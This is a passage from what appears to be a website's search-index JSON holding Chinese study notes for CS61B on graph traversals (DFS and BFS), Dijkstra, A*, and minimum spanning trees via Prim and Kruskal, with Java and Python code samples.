graphs</code>\uff1a\u65e0\u5411\u56fe\u7684\u8fb9\u53ef\u4ee5\u53cc\u5411\u8bbf\u95ee\uff0c\u800c\u6709\u5411\u56fe\u7684\u8fb9\u6709\u65b9\u5411</li> <li>\u6709\u73af\u56fe<code>cyclic graphs</code>\u6216\u65e0\u73af\u56fe<code>acyclic graphs</code>\uff1a\u6709\u73af\u56fe\u5305\u542b\u4ece\u67d0\u8282\u70b9\u51fa\u53d1\u7ecf\u8fc7\u4e00\u4e9b\u8fb9\u540e\u56de\u5230\u8be5\u8282\u70b9\u7684\u8def\u5f84\uff0c\u800c\u65e0\u73af\u56fe\u6ca1\u6709\u8fd9\u6837\u7684\u8def\u5f84</li> <li>s-t Path: Is there a path between vertices s and t?</li> <li>\u6df1\u5ea6\u4f18\u5148\u641c\u7d22<code>Depth First Search (DFS)</code>\uff1a</li> <li>\u4ece\u8d77\u59cb\u8282\u70b9<code>s</code>\u5f00\u59cb\uff0c\u6cbf\u7740\u4e00\u6761\u8def\u5f84\u5c3d\u53ef\u80fd\u6df1\u5165\uff0c\u76f4\u5230\u5230\u8fbe\u76ee\u6807\u8282\u70b9<code>t</code>\u6216\u6ca1\u6709\u66f4\u591a\u7684\u8282\u70b9\u53ef\u4ee5\u8bbf\u95ee\u4e3a\u6b62</li> <li>\u5982\u679c\u5728\u67d0\u6761\u8def\u5f84\u4e0a\u6ca1\u6709\u627e\u5230\u76ee\u6807\u8282\u70b9t\uff0c\u5219\u56de\u6eaf\u5230\u4e0a\u4e00\u4e2a\u8282\u70b9\uff0c\u7ee7\u7eed\u63a2\u7d22\u5176\u4ed6\u8def\u5f84</li> <li> <p>DFS \u524d\u5e8f\u904d\u5386\uff08Preorder\uff09</p> <ul> <li>\u5728\u524d\u5e8f\u904d\u5386\u4e2d\uff0c\u64cd\u4f5c\u5728\u9012\u5f52\u8c03\u7528\u90bb\u5c45\u8282\u70b9\u4e4b\u524d\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u9996\u5148\u5904\u7406\u5f53\u524d\u8282\u70b9\uff0c\u7136\u540e\u9012\u5f52\u5904\u7406\u5176\u90bb\u5c45\u8282\u70b9</li> </ul> <pre><code>void dfsPreorder(int s) {\n    mark(s); // \u6807\u8bb0\u5f53\u524d\u8282\u70b9\uff0c\u907f\u514d\u65e0\u9650\u9012\u5f52\n    action(s); // \u6267\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u8bbe\u7f6eedgeTo\uff0c\n    for (int neighbor : neighbors(s)) {\n        if (!isMarked(neighbor)) {\n            dfsPreorder(neighbor);\n        }\n    }\n}\n</code></pre> </li> <li> <p>DFS \u540e\u5e8f\u904d\u5386\uff08Postorder\uff09</p> <ul> <li>\u5728\u540e\u5e8f\u904d\u5386\u4e2d\uff0c\u64cd\u4f5c\u5728\u9012\u5f52\u8c03\u7528\u90bb\u5c45\u8282\u70b9\u4e4b\u540e\u8fdb\u884c\uff0c\u8fd9\u610f\u5473\u7740\u9996\u5148\u9012\u5f52\u5904\u7406\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u90bb\u5c45\u8282\u70b9\uff0c\u7136\u540e\u518d\u5904\u7406\u5f53\u524d\u8282\u70b9</li> </ul> <pre><code>    void dfsPostorder(int s) {\n    mark(s); // \u6807\u8bb0\u5f53\u524d\u8282\u70b9\n    for (int neighbor : neighbors(s)) {\n        if (!isMarked(neighbor)) {\n            dfsPostorder(neighbor);\n        }\n    }\n    action(s); // \u6267\u884c\u64cd\u4f5c\uff0c\u4f8b\u5982\u6253\u5370\u8282\u70b9\n}\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec22_graph_traversals_and_implementations","title":"Lec.22 Graph Traversals and Implementations","text":""},{"location":"cs61b%20notes/w1dsy2ew/#221_graph_implementations","title":"22.1 Graph Implementations","text":"<ol> <li> <p><code>Graphs API</code></p> <pre><code>public class Graph {\npublic Graph(int V);               // \u521b\u5efa\u4e00\u4e2a\u5305\u542bV\u4e2a\u9876\u70b9\u7684\u7a7a\u56fe\npublic void addEdge(int v, int w); // \u6dfb\u52a0\u8fb9v-w\nIterable&lt;Integer&gt; adj(int v);      // \u8fd4\u56de\u4e0e\u9876\u70b9v\u76f8\u90bb\u7684\u9876\u70b9\nint V();                           // \u8fd4\u56de\u9876\u70b9\u6570\nint E();                           // \u8fd4\u56de\u8fb9\u6570\n}\n</code></pre> </li> <li> <p>\u90bb\u63a5\u77e9\u9635 <code>Adjacency Matrix</code></p> <ul> <li>\u4f7f\u7528\u4e8c\u7ef4\u6570\u7ec4\u8868\u793a\u56fe</li> <li>\u6bcf\u4e2a\u9876\u70b9\u5bf9\u4e4b\u95f4\u90fd\u6709\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u5b58\u5728\u8fb9</li> <li>\u5bf9\u4e8e\u4e00\u4e2a\u5305\u542b <code>V</code> \u4e2a\u9876\u70b9\u7684\u56fe\uff0c\u90bb\u63a5\u77e9\u9635\u662f\u4e00\u4e2a <code>V x V</code> \u7684\u5e03\u5c14\u6570\u7ec4</li> <li>\u7b80\u5355\u76f4\u89c2\uff0c\u68c0\u67e5\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u662f\u5426\u5b58\u5728\u8fb9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(1)</code></li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\u9ad8\uff0c\u4e3a <code>O(V^2)</code>\uff0c\u4e0d\u9002\u7528\u4e8e\u7a00\u758f\u56fe (\u5373\u8fb9\u6570\u8fdc\u5c0f\u4e8e\u9876\u70b9\u6570\u7684\u56fe)</li> </ul> <pre><code>  int[][] adjMatrix = new int[V][V];\n</code></pre> </li> <li> <p>\u90bb\u63a5\u8868 <code>Adjacency List</code></p> <ul> <li>\u7a7a\u95f4\u6548\u7387\u9ad8\uff0c\u9002\u7528\u4e8e\u7a00\u758f\u56fe\u3002</li> <li>\u904d\u5386\u4e00\u4e2a\u9876\u70b9\u7684\u6240\u6709\u76f8\u90bb\u9876\u70b9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(degree(v))</code>\uff0c\u5176\u4e2d <code>degree(v)</code> \u662f\u9876\u70b9 <code>v</code> \u7684\u6df1\u5ea6</li> <li>\u68c0\u67e5\u4e24\u4e2a\u9876\u70b9\u4e4b\u95f4\u662f\u5426\u5b58\u5728\u8fb9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(degree(v))</code></li> </ul> <pre><code>List&lt;Integer&gt;[] adjList = new List[V];\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#222_graph_traversals","title":"22.2 Graph Traversals","text":"<ol> <li> <p><code>DFS</code> \u6df1\u5ea6\u4f18\u5148\u641c\u7d22</p> <ol> <li>\u6807\u8bb0\u5f53\u524d\u9876\u70b9\u4e3a\u5df2\u8bbf\u95ee</li> <li>\u9012\u5f52\u5730\u8bbf\u95ee\u6240\u6709\u672a\u88ab\u6807\u8bb0\u7684\u76f8\u90bb\u9876\u70b9</li> <li>\u8bb0\u5f55\u8def\u5f84</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u5bf9\u4e8e\u4f7f\u7528\u90bb\u63a5\u8868\u8868\u793a\u7684\u56fe\uff0c<code>DFS</code> \u7684\u8fd0\u884c\u65f6\u95f4\u4e3a <code>O(V + E)</code>\uff0c\u5176\u4e2d <code>V</code> \u662f\u9876\u70b9\u6570\uff0c<code>E</code> \u662f\u8fb9\u6570\uff0c\u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u9876\u70b9\u548c\u6bcf\u6761\u8fb9\u90fd\u53ea\u4f1a\u88ab\u8bbf\u95ee\u4e00\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>DFS</code> \u9700\u8981 <code>O(V)</code> \u7684\u7a7a\u95f4\u6765\u5b58\u50a8\u6807\u8bb0\u6570\u7ec4\u548c\u8def\u5f84\u6570\u7ec4\uff0c\u6807\u8bb0\u6570\u7ec4\u7528\u4e8e\u8bb0\u5f55\u6bcf\u4e2a\u9876\u70b9\u662f\u5426\u5df2\u88ab\u8bbf\u95ee\uff0c\u8def\u5f84\u6570\u7ec4\u7528\u4e8e\u8bb0\u5f55\u4ece\u8d77\u59cb\u9876\u70b9\u5230\u5f53\u524d\u9876\u70b9\u7684\u8def\u5f84</li> </ol> <p>```java public class DepthFirstPaths {     private boolean[] marked;     private int[] edgeTo;     private int s;</p> <pre><code>public DepthFirstPaths(Graph G, int s) {\n    ...\n    dfs(G, s);\n}\nprivate void dfs(Graph G, int v) {\n    marked[v] = true;\n    for (int w : G.adj(v)) {\n        if (!marked[w]) {\n        edgeTo[w] = v;\n        dfs(G, w);\n        }         \n    } \n}\n</code></pre> <p>...    }    ```</p> </li> <li> <p><code>BFS</code> \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff1a\u4f7f\u7528\u961f\u5217\u6765\u8ddf\u8e2a\u9700\u8981\u8bbf\u95ee\u7684\u9876\u70b9\uff0c<code>BFS</code> \u4ece\u4e00\u4e2a\u8d77\u59cb\u9876\u70b9\u5f00\u59cb\uff0c\u6309\u8ddd\u79bb\u4ece\u6e90\u9876\u70b9\u7684\u987a\u5e8f\u9010\u5c42\u904d\u5386\u56fe</p> <ol> <li>\u5c06\u8d77\u59cb\u9876\u70b9\u6807\u8bb0\u4e3a\u5df2\u8bbf\u95ee\u5e76\u52a0\u5165\u961f\u5217</li> <li>\u5f53\u961f\u5217\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u53d6\u51fa\u961f\u5217\u7684\u7b2c\u4e00\u4e2a\u9876\u70b9\uff0c\u8bbf\u95ee\u5176\u6240\u6709\u672a\u88ab\u6807\u8bb0\u7684\u76f8\u90bb\u9876\u70b9\uff0c\u5e76\u5c06\u8fd9\u4e9b\u9876\u70b9\u52a0\u5165\u961f\u5217</li> <li>\u8bb0\u5f55\u8def\u5f84</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\u5bf9\u4e8e\u4f7f\u7528\u90bb\u63a5\u8868\u8868\u793a\u7684\u56fe\uff0c<code>BFS</code> \u7684\u8fd0\u884c\u65f6\u95f4\u4e3a <code>O(V + E)</code>\uff0c\u5176\u4e2d <code>V</code> \u662f\u9876\u70b9\u6570\uff0c<code>E</code> \u662f\u8fb9\u6570\uff0c\u8fd9\u662f\u56e0\u4e3a\u6bcf\u4e2a\u9876\u70b9\u548c\u6bcf\u6761\u8fb9\u90fd\u53ea\u4f1a\u88ab\u8bbf\u95ee\u4e00\u6b21</li> <li>\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a<code>BFS</code> \u9700\u8981 <code>O(V)</code> \u7684\u7a7a\u95f4\u6765\u5b58\u50a8\u6807\u8bb0\u6570\u7ec4\u548c\u8def\u5f84\u6570\u7ec4\uff0c\u6807\u8bb0\u6570\u7ec4\u7528\u4e8e\u8bb0\u5f55\u6bcf\u4e2a\u9876\u70b9\u662f\u5426\u5df2\u88ab\u8bbf\u95ee\uff0c\u8def\u5f84\u6570\u7ec4\u7528\u4e8e\u8bb0\u5f55\u4ece\u8d77\u59cb\u9876\u70b9\u5230\u5f53\u524d\u9876\u70b9\u7684\u8def\u5f84</li> </ol> <pre><code>public class BreadthFirstPaths {\n    private boolean[] marked; // \u6807\u8bb0\u9876\u70b9\u662f\u5426\u88ab\u8bbf\u95ee\n    private int[] edgeTo; // \u8bb0\u5f55\u8d77\u59cb\u9876\u70b9\u5230\u5f53\u524d\u9876\u70b9\u7684\u8def\u5f84\n    private int s;\n\n    public BreadthFirstPaths(Graph G, int s) {\n        marked = new boolean[G.V()];\n        edgeTo = new int[G.V()];\n        this.s = s;\n        bfs(G, s);\n    }\n\n    private void bfs(Graph G, int s) {\n        Queue&lt;Integer&gt; queue = new LinkedList&lt;&gt;();\n        marked[s] = true;\n        queue.add(s);\n        while (!queue.isEmpty()) {\n            int v = queue.poll();\n            for (int w : G.adj(v)) {\n                if (!marked[w]) {\n                    edgeTo[w] = v;\n                    marked[w] = true;\n                    queue.add(w);\n                }\n            }\n        }\n    }\n    // \u68c0\u67e5\u662f\u5426\u5b58\u5728\u8d77\u59cb\u9876\u70b9\u5230\u76ee\u6807\u9876\u70b9\u7684\u8def\u5f84\n    public boolean hasPathTo(int v) {\n        return marked[v]; \n    }\n    // \u8fd4\u56de\u8d77\u59cb\u9876\u70b9\u5230\u76ee\u6807\u9876\u70b9\u7684\u8def\u5f84\n    public Iterable&lt;Integer&gt; pathTo(int v) {\n        if (!hasPathTo(v)) return null;\n        LinkedList&lt;Integer&gt; path = new LinkedList&lt;&gt;();\n        for (int x = v; x != s; x = edgeTo[x]) {\n            path.addFirst(x);\n        }\n        path.addFirst(s);\n        return path;\n    }\n}\n</code></pre> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec23_shortest_path","title":"Lec.23 Shortest Path","text":"<p>\u5e7f\u5ea6\u4f18\u5148\u7b97\u6cd5\u65e0\u6cd5\u7528\u4e8e\u52a0\u6743\u56fe\uff0c\u56e0\u6b64\u9700\u8981\u5bfb\u627e\u65b0\u7684\u7b97\u6cd5\u53bb\u627e\u5230\u52a0\u6743\u56fe\u4e2d\u7684\u6700\u77ed\u8def\u5f84</p>"},{"location":"cs61b%20notes/w1dsy2ew/#231_dijkstra_algorithm","title":"23.1 Dijkstra Algorithm","text":"<ol> <li>\u901a\u8fc7\u4f18\u5148\u961f\u5217 (\u901a\u5e38\u662f\u6700\u5c0f\u5806) \u6765\u8ddf\u8e2a\u5f53\u524d\u5df2\u77e5\u7684\u6700\u77ed\u8def\u5f84\uff0c\u5e76\u9010\u6b65\u6269\u5c55\u8fd9\u4e9b\u8def\u5f84\u9002\u7528\u4e8e\u6240\u6709\u8fb9\u6743\u91cd\u4e3a\u975e\u8d1f\u7684\u56fe</li> <li>\u521d\u59cb\u5316\uff1a<ul> <li>\u5c06\u6e90\u9876\u70b9\u7684\u8ddd\u79bb\u8bbe\u4e3a<code>0</code>\uff0c\u5176\u4ed6\u9876\u70b9\u7684\u8ddd\u79bb\u8bbe\u4e3a\u65e0\u7a77\u5927</li> <li>\u5c06\u6240\u6709\u9876\u70b9\u52a0\u5165\u4f18\u5148\u961f\u5217\uff0c\u521d\u59cb\u65f6\u6e90\u9876\u70b9\u7684\u4f18\u5148\u7ea7\u4e3a0\uff0c\u5176\u4ed6\u9876\u70b9\u7684\u4f18\u5148\u7ea7\u4e3a\u65e0\u7a77\u5927</li> </ul> </li> <li>\u53d6\u51fa\u4f18\u5148\u961f\u5217\u4e2d\u8ddd\u79bb\u6700\u5c0f\u7684\u9876\u70b9\uff1a<ul> <li>\u4ece\u4f18\u5148\u961f\u5217\u4e2d\u53d6\u51fa\u8ddd\u79bb\u6700\u5c0f\u7684\u9876\u70b9\uff0c\u5e76\u6807\u8bb0\u4e3a\u5df2\u8bbf\u95ee</li> </ul> </li> <li><code>Relaxation</code> \u64cd\u4f5c\uff1a<ul> <li>\u5bf9\u4e8e\u8be5\u9876\u70b9\u7684\u6bcf\u4e2a\u76f8\u90bb\u9876\u70b9\uff0c\u8ba1\u7b97\u901a\u8fc7\u8be5\u9876\u70b9\u5230\u8fbe\u76f8\u90bb\u9876\u70b9\u7684\u8ddd\u79bb</li> <li>\u5982\u679c\u8be5\u8ddd\u79bb\u5c0f\u4e8e\u5f53\u524d\u5df2\u77e5\u7684\u8ddd\u79bb\uff0c\u5219\u66f4\u65b0\u8ddd\u79bb\u5e76\u5c06\u76f8\u90bb\u9876\u70b9\u52a0\u5165\u4f18\u5148\u961f\u5217\u6216\u66f4\u65b0\u5176\u4f18\u5148\u7ea7</li> </ul> </li> <li>\u91cd\u590d\u6b65\u9aa4<code>3</code>\u548c<code>4</code>\uff0c\u76f4\u5230\u4f18\u5148\u961f\u5217\u4e3a\u7a7a</li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(E \u00b7 log V)</code></li> <li> <p>\u6bcf\u4e2a\u9876\u70b9\u548c\u6bcf\u6761\u8fb9\u90fd\u53ea\u4f1a\u88ab\u8bbf\u95ee\u4e00\u6b21\uff0c\u5e76\u4e14\u4f18\u5148\u961f\u5217\u7684\u64cd\u4f5c (\u63d2\u5165\u3001\u5220\u9664\u548c\u66f4\u65b0) \u5728\u6700\u5c0f\u5806\u5b9e\u73b0\u4e2d\u9700\u8981 <code>O(log V)</code> \u7684\u65f6\u95f4</p> <pre><code>def dijkstras(source):\n    # \u5c06\u6e90\u9876\u70b9\u6dfb\u52a0\u5230\u4f18\u5148\u961f\u5217PQ\u4e2d\uff0c\u521d\u59cb\u8ddd\u79bb\u4e3a0\n    PQ.add(source, 0)\n    # \u5bf9\u4e8e\u6240\u6709\u5176\u4ed6\u9876\u70b9\uff0c\u5c06\u5b83\u4eec\u6dfb\u52a0\u5230\u4f18\u5148\u961f\u5217PQ\u4e2d\uff0c\u521d\u59cb\u8ddd\u79bb\u4e3a\u65e0\u7a77\u5927\n    For all other vertices, v, PQ.add(v, infinity)\n    # \u5f53\u4f18\u5148\u961f\u5217PQ\u4e0d\u4e3a\u7a7a\u65f6\uff0c\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\n    while PQ is not empty:\n        # \u4ece\u4f18\u5148\u961f\u5217\u4e2d\u79fb\u9664\u8ddd\u79bb\u6700\u5c0f\u7684\u9876\u70b9p\n        p = PQ.removeSmallest()\n        # \u5bf9\u9876\u70b9p\u7684\u6240\u6709\u8fb9\u8fdb\u884c\u677e\u5f1b\u64cd\u4f5c\n        relax(all edges from p)\n</code></pre> <pre><code>def relax(edge p, q):\n    # \u5982\u679c\u9876\u70b9q\u5df2\u7ecf\u88ab\u8bbf\u95ee\uff08\u5373q\u4e0d\u5728\u4f18\u5148\u961f\u5217PQ\u4e2d\uff09\uff0c\u5219\u8fd4\u56de\n    if q is visited (i.e., q is not in PQ):\n        return\n    # \u5982\u679c\u901a\u8fc7\u9876\u70b9p\u5230\u8fbe\u9876\u70b9q\u7684\u8ddd\u79bb\u5c0f\u4e8e\u5f53\u524d\u5df2\u77e5\u7684\u8ddd\u79bb\uff0c\u5219\u66f4\u65b0\u8ddd\u79bb\u548c\u8def\u5f84\n    if distTo[p] + weight(edge) &lt; distTo[q]:\n        # \u66f4\u65b0\u9876\u70b9q\u7684\u6700\u77ed\u8ddd\u79bb\n        distTo[q] = distTo[p] + w\n        # \u66f4\u65b0\u9876\u70b9q\u7684\u524d\u9a71\u9876\u70b9\u4e3ap\n        edgeTo[q] = p\n        # \u66f4\u65b0\u4f18\u5148\u961f\u5217\u4e2d\u9876\u70b9q\u7684\u4f18\u5148\u7ea7\n        PQ.changePriority(q, distTo[q])\n</code></pre> </li> <li> <p><code>Dijkstra</code>\u7b97\u6cd5\u7684\u5173\u952e\u4e0d\u53d8\u91cf</p> <ol> <li><code>distTo[v]</code>\u662f\u4ece\u6e90\u9876\u70b9\u5230\u9876\u70b9 <code>v</code> \u7684\u5df2\u77e5\u6700\u77ed\u8ddd\u79bb</li> <li>\u4f18\u5148\u961f\u5217<code>PQ</code>\u4e2d\u7684\u9876\u70b9\u6309\u7167<code>distTo</code>\u503c\u7684\u5347\u5e8f\u6392\u5217</li> </ol> </li> <li>\u6b63\u786e\u6027\u8bc1\u660e<ol> <li>\u5047\u8bbe\u5728\u67d0\u4e2a\u65f6\u523b\uff0c\u9876\u70b9<code>u</code>\u4ece\u4f18\u5148\u961f\u5217\u4e2d\u53d6\u51fa\uff0c\u5e76\u4e14<code>distTo[u]</code>\u4e0d\u662f\u4ece\u6e90\u9876\u70b9\u5230\u9876\u70b9<code>u</code>\u7684\u6700\u77ed\u8ddd\u79bb</li> <li>\u8fd9\u610f\u5473\u7740\u5b58\u5728\u4e00\u6761\u8def\u5f84\uff0c\u4f7f\u5f97\u901a\u8fc7\u5176\u4ed6\u9876\u70b9<code>v</code>\u5230\u8fbe\u9876\u70b9<code>u</code>\u7684\u8ddd\u79bb\u5c0f\u4e8e<code>distTo[u]</code></li> <li>\u4f46\u662f\uff0c\u6839\u636e<code>Dijkstra</code>\u7b97\u6cd5\u7684\u6b65\u9aa4\uff0c\u9876\u70b9<code>v</code>\u5e94\u8be5\u5df2\u7ecf\u5728\u9876\u70b9<code>u</code>\u4e4b\u524d\u4ece\u4f18\u5148\u961f\u5217\u4e2d\u53d6\u51fa\uff0c\u5e76\u4e14<code>distTo[u]</code>\u5e94\u8be5\u5df2\u7ecf\u88ab\u66f4\u65b0\u4e3a\u66f4\u5c0f\u7684\u503c</li> <li>\u8fd9\u4e0e\u5047\u8bbe\u77db\u76fe\uff0c\u56e0\u6b64<code>distTo[u]</code>\u5fc5\u987b\u662f\u4ece\u6e90\u9876\u70b9\u5230\u9876\u70b9u\u7684\u6700\u77ed\u8ddd\u79bb</li> </ol> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#232_a_algorithm","title":"23.2 A* Algorithm","text":"<ol> <li><code>A*</code>\u7b97\u6cd5\u662f\u4e00\u79cd\u542f\u53d1\u5f0f<code>heuristic</code>\u641c\u7d22\u7b97\u6cd5\uff0c\u9002\u7528\u4e8e\u5355\u6e90\u5355\u76ee\u6807\u6700\u77ed\u8def\u5f84\u95ee\u9898\uff0c\u5b83\u7ed3\u5408\u4e86<code>Dijkstra</code>\u7b97\u6cd5\u548c\u542f\u53d1\u5f0f\u51fd\u6570\uff0c\u901a\u8fc7\u4f18\u5148\u8003\u8651\u4f30\u8ba1\u8ddd\u79bb\u8f83\u5c0f\u7684\u9876\u70b9\u6765\u52a0\u901f\u641c\u7d22</li> <li>\u5373\u5728\u8ba1\u7b97\u4f18\u5148\u961f\u5217\u7684\u4f18\u5148\u7ea7\u7684\u65f6\u5019\uff0c\u5728\u5b9e\u9645\u8ddd\u79bb\u7684\u57fa\u7840\u4e0a\uff0c\u52a0\u4e0a\u4e00\u4e2a\u542f\u53d1\u5f0f\u7684\u4f30\u8ba1\u8ddd\u79bb\uff0c\u5176\u4f59\u8ba1\u7b97\u65b9\u5f0f\u4e8e<code>Dijkstra</code>\u7b97\u6cd5\u4e00\u81f4</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec24_minimum_spanning_trees","title":"Lec.24 Minimum Spanning Trees\u6700\u5c0f\u751f\u6210\u6811","text":"<ol> <li>\u6700\u5c0f\u751f\u6210\u6811 <code>(MST)</code>: \u662f\u65e0\u5411\u56fe\u7684\u5b50\u56fe\uff0c\u5305\u542b\u6240\u6709\u9876\u70b9\uff0c\u4e14\u8fb9\u7684\u603b\u6743\u91cd\u6700\u5c0f</li> <li><code>Cut Property</code>\uff1a\u5bf9\u4e8e\u4efb\u4f55\u5207\u5272\uff0c\u6700\u5c0f\u6743\u91cd\u7684\u6a2a\u5207\u8fb9\u5fc5\u5b9a\u5728MST\u4e2d</li> <li>\u5207\u5272\uff1a\u5c06\u56fe\u7684\u9876\u70b9\u5206\u6210\u4e24\u4e2a\u975e\u7a7a\u96c6\u5408</li> <li>\u6a2a\u5207\u8fb9\uff1a\u8fde\u63a5\u4e24\u4e2a\u96c6\u5408\u7684\u8fb9</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#241_prim_algorithm","title":"24.1 Prim Algorithm","text":"<ul> <li>\u4ece\u4e00\u4e2a\u4efb\u610f\u7684\u8d77\u59cb\u9876\u70b9\u5f00\u59cb\uff0c\u9010\u6b65\u6269\u5c55MST\uff0c\u76f4\u5230\u5305\u542b\u6240\u6709\u9876\u70b9</li> <li> <p><code>Prim</code>\u7b97\u6cd5\u4e0e<code>Dijkstra</code>\u7b97\u6cd5\u7684\u6bd4\u8f83\uff1a<code>Prim</code>\u7b97\u6cd5\u8003\u8651\u7684\u662f\u4ece<code>MST</code>\u7684\u8ddd\u79bb\uff0c<code>Dijkstra</code>\u7b97\u6cd5\u8003\u8651\u7684\u662f\u4ece\u6e90\u9876\u70b9\u7684\u8ddd\u79bb</p> </li> <li> <p>\u521d\u59cb\u5316\uff1a</p> <ul> <li>\u4ece\u4efb\u610f\u8d77\u59cb\u9876\u70b9\u5f00\u59cb\uff0c\u5c06\u5176\u52a0\u5165<code>MST</code></li> <li>\u521d\u59cb\u5316\u4e00\u4e2a\u4f18\u5148\u961f\u5217\uff0c\u7528\u4e8e\u5b58\u50a8\u5f53\u524d\u5df2\u77e5\u7684\u6700\u5c0f\u6743\u91cd\u8fb9</li> </ul> </li> <li>\u4e3b\u5faa\u73af\uff1a<ul> <li>\u627e\u5230\u4e00\u6761\u8fde\u63a5<code>MST</code>\u5185\u9876\u70b9\u548c<code>MST</code>\u5916\u9876\u70b9\u7684\u6700\u5c0f\u6743\u91cd\u8fb9\uff0c\u5c06\u8be5\u8fb9\u548c\u9876\u70b9\u52a0\u5165<code>MST</code></li> <li>\u66f4\u65b0\u4f18\u5148\u961f\u5217\uff0c\u52a0\u5165\u65b0\u7684\u6700\u5c0f\u6743\u91cd\u8fb9</li> <li>\u91cd\u590d\u4ee5\u4e0a\u6b65\u9aa4\uff0c\u77e5\u9053<code>MST</code>\u5305\u542b\u6240\u6709\u9876\u70b9</li> </ul> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>O(E log V)</code>\uff0c\u5176\u4e2d <code>E</code> \u662f\u8fb9\u6570\uff0c<code>V</code> \u662f\u9876\u70b9\u6570\uff0c\u6bcf\u6b21\u4ece\u4f18\u5148\u961f\u5217\u4e2d\u53d6\u51fa\u6700\u5c0f\u6743\u91cd\u8fb9\u7684\u64cd\u4f5c\u9700\u8981 <code>O(log V)</code> \u7684\u65f6\u95f4\uff0c\u800c\u603b\u5171\u9700\u8981\u8fdb\u884c <code>E</code> \u6b21\u8fd9\u6837\u7684\u64cd\u4f5c</li> </ul> <pre><code>def prim_mst(graph):\n    # \u521d\u59cb\u5316\n    start_vertex = 0\n    mst = []\n    visited = set()\n    pq = PriorityQueue()\n    # \u5c06\u8d77\u59cb\u9876\u70b9\u52a0\u5165\u4f18\u5148\u961f\u5217\n    pq.put((0, start_vertex))\n    while not pq.empty():\n        # \u53d6\u51fa\u4f18\u5148\u961f\u5217\u4e2d\u6743\u91cd\u6700\u5c0f\u7684\u8fb9\n        weight, current_vertex = pq.get()\n        if current_vertex in visited:\n            continue\n        # \u5c06\u9876\u70b9\u52a0\u5165MST\n        visited.add(current_vertex)\n        mst.append((weight, current_vertex))\n        # \u66f4\u65b0\u4f18\u5148\u961f\u5217\uff0c\u52a0\u5165\u65b0\u7684\u6700\u5c0f\u6743\u91cd\u8fb9\n        for neighbor, weight in graph[current_vertex]:\n            if neighbor not in visited:\n                pq.put((weight, neighbor))\n\n    return mst\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#242_kruskal_algorithm","title":"24.2 Kruskal Algorithm","text":"<ul> <li> <p>\u6309\u8fb9\u7684\u6743\u91cd\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u9010\u6b65\u6dfb\u52a0\u8fb9\u5230MST\u4e2d\uff0c\u540c\u65f6\u907f\u514d\u5f62\u6210\u73af</p> </li> <li> <p>\u5c06\u6240\u6709\u8fb9\u6309\u6743\u91cd\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff1a</p> <ul> <li>\u8fd9\u4e00\u6b65\u53ef\u4ee5\u4f7f\u7528\u5feb\u901f\u6392\u5e8f\u6216\u5806\u6392\u5e8f\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a O(E log E)\uff0c\u5176\u4e2d E \u662f\u8fb9\u6570</li> </ul> </li> <li>\u521d\u59cb\u5316\u5e76\u67e5\u96c6\uff1a<ul> <li>\u4f7f\u7528\u5e76\u67e5\u96c6\uff08Union-Find\uff09\u6570\u636e\u7ed3\u6784\u6765\u7ba1\u7406\u9876\u70b9\u7684\u8fde\u901a\u6027\uff0c\u5e2e\u52a9\u68c0\u6d4b\u73af\u7684\u5f62\u6210 (WQUPC)\u53ef\u89c1<code>Lec14.5</code></li> </ul> </li> <li>\u4e3b\u5faa\u73af\uff1a<ul> <li>\u91cd\u590d\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u76f4\u5230<code>MST</code>\u5305\u542b<code>V-1</code>\u6761\u8fb9 (<code>V</code>\u662f\u9876\u70b9\u6570)\uff1a</li> <li>\u53d6\u51fa\u6700\u5c0f\u6743\u91cd\u8fb9</li> <li>\u4f7f\u7528\u5e76\u67e5\u96c6\u68c0\u67e5\u8fd9\u6761\u8fb9\u7684\u4e24\u4e2a\u9876\u70b9\u662f\u5426\u5728\u540c\u4e00\u4e2a\u8fde\u901a\u5206\u91cf\u4e2d</li> <li>\u5982\u679c\u4e0d\u5728\u540c\u4e00\u4e2a\u8fde\u901a\u5206\u91cf\u4e2d\uff0c\u6dfb\u52a0\u8be5\u8fb9\u5230<code>MST</code>\uff0c\u5e76\u5c06\u4e24\u4e2a\u9876\u70b9\u5408\u5e76\u5230\u540c\u4e00\u4e2a\u8fde\u901a\u5206\u91cf\u4e2d</li> </ul> </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a<code>Kruskal</code>\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(E log E)</code>\uff0c\u4f7f\u7528\u4f18\u5148\u961f\u5217\u65f6\u4e3a <code>O(E log V)</code><ul> <li>\u6392\u5e8f\u6240\u6709\u8fb9\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a <code>O(E log E)</code></li> <li>\u5e76\u67e5\u96c6\u7684\u64cd\u4f5c (\u67e5\u627e\u548c\u5408\u5e76) 